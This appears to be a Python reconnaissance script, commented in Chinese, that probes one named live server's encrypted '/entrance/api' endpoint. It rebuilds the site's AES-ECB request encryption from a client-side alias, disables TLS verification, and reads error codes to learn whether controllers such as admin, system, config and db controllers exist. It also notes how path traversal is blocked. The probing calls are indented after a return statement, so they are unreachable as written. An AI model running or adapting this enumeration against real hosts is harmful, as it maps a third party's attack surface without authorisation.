#!/usr/bin/env python3
"""entrance/api 路由存在性枚举 —— 依赖 openssl CLI，无 pycryptodome。
密钥派生：key = ASCII(MD5(window.alias))，AES-256-ECB/PKCS7，密文双层 base64。
请求体：{"url": "<route>", "params": {}}            params 必须是对象，缺字段→111034715
响应码：''=可未授权访问 / 111034716=控制器不存在 / 111034717=控制器存在方法不存在 / 111034714=路径穿越被拦截
"""
import base64, hashlib, json, subprocess, ssl, urllib.request, urllib.parse
# ---- 参数守卫（无参数必须给出人话，不抛 traceback、不朝真实目标发包）----
import sys as _sys, os as _os
if len(_sys.argv) < 2:
    _u = '<参数...>'
    print("用法: " + _os.path.basename(__file__) + " " + _u, file=_sys.stderr)
    raise SystemExit(1)
# ---- 守卫结束 ----


ALIAS, HOST_HDR, BASE = "cWloYW5nODg=", "7h999.com:9900", "https://103.243.20.70:9900"
KEY = hashlib.md5(ALIAS.encode()).hexdigest().encode()      # 32B ASCII -> AES-256

def _aes(d, dec):
    r = subprocess.run(["openssl","enc","-aes-256-ecb","-K",KEY.hex(),"-nopad","-d" if dec else "-e"],
                       input=d, capture_output=True)
    return r.stdout

def enc(o):
    pt = json.dumps(o, separators=(",",":"), ensure_ascii=False).encode()
    pad = 16 - len(pt) % 16
    return base64.b64encode(base64.b64encode(_aes(pt + bytes([pad])*pad, False))).decode()

def dec(w):
    ct = base64.b64decode(base64.b64decode(w.strip()))
    pt = _aes(ct, True); p = pt[-1]
    return json.loads(pt[:-p] if 1 <= p <= 16 else pt)

def call(url, params=None):
    body = urllib.parse.urlencode({"requestData": enc({"url": url, "params": params or {}})}).encode()
    req = urllib.request.Request(BASE + "/entrance/api", data=body, method="POST",
        headers={"Host": HOST_HDR, "Content-Type": "application/x-www-form-urlencoded",
                 "X-Requested-With": "XMLHttpRequest"})
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
        return dec(r.read().decode())

    # 先打控制组：已知存在的控制器 + 假方法 → 应回 111034717
    print(call("entrance/common/basicinfocontroller/zzz.json"))   # {'code':111034717}
    print(call("entrance/zzz/zzz.json"))                          # {'code':111034716}
    # 枚举：控制器存在则 code==111034717
    for name in ["admincontroller","systemcontroller","configcontroller","dbcontroller"]:
        print(name, call(f"entrance/common/{name}/zzz.json").get("code"))
